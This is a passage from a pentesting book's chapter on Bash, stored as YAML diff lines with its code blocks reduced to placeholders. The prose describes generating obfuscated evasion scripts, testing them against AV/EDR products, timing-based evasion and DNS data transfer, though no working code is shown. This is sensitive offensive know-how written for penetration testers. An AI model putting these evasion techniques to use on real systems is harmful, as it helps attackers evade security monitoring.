+  type: TYPE_NORMAL
+- en: '[PRE49]'
+  prefs: []
+  type: TYPE_PRE
+- en: The preceding code block is responsible for generating and testing multiple
+    iterations of obfuscation.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE50]'
+  prefs: []
+  type: TYPE_PRE
+- en: This script demonstrates a basic approach to testing obfuscated scripts. The
+    **test_script** function simulates testing a script against different AV/EDR solutions.
+    In a real-world scenario, you would replace these simulations with actual scans
+    using AV/EDR products or online scanning services.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The **generate_and_test** function generates multiple variations of obfuscated
+    scripts and tests each one. This allows us to see how different combinations of
+    obfuscation techniques perform against detection systems.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The script generates a specified number of obfuscated variations and runs them
+    through the testing process, providing results for each variation.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'It’s important to note that this is a simplified example for demonstration
+    purposes. In practice, testing against AV/EDR solutions would involve more comprehensive
+    methods, potentially including the following:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Using a dedicated testing environment or sandbox
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Employing multiple AV/EDR products for thorough testing
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Analyzing behavioral detection in addition to signature-based detection
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Continuously updating the testing process as AV/EDR solutions evolve
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: By systematically testing and validating our obfuscated scripts, we can refine
+    our obfuscation techniques and ensure that they remain effective against current
+    detection methods.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Throughout this section, we learned how to create a comprehensive system for
+    generating, obfuscating, and testing evasion scripts in Bash. This automated approach
+    not only saves time but also allows for the creation of more sophisticated and
+    effective evasion techniques.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Summary
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In this chapter, we explored techniques for evading detection by AV and EDR
+    systems during pentests, focusing on Bash shell scripting. We covered methods
+    for gathering information about the security environment, basic and advanced obfuscation
+    techniques, and strategies for automating the generation of evasive scripts.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We learned how to use Bash commands to identify installed security software
+    and active monitoring processes. We examined various obfuscation methods, including
+    variable name obfuscation, command substitution, and encoding techniques. We also
+    covered advanced evasion tactics such as timing-based evasion and transferring
+    data using DNS. Finally, we discussed the development of a framework for generating
+    obfuscated Bash scripts and testing their effectiveness against common AV and
+    EDR solutions.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The value of these techniques will become apparent as more stakeholders install
+    endpoint protection agents on Linux systems. This will make it more difficult
+    to pentest and your new obfuscation skills will be of great benefit.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In [*Chapter 15*](B22229_15.xhtml#_idTextAnchor600) , we’ll explore the topic
+    of interfacing with artificial intelligence and its applications in pentesting.
+  prefs: []
+  type: TYPE_NORMAL
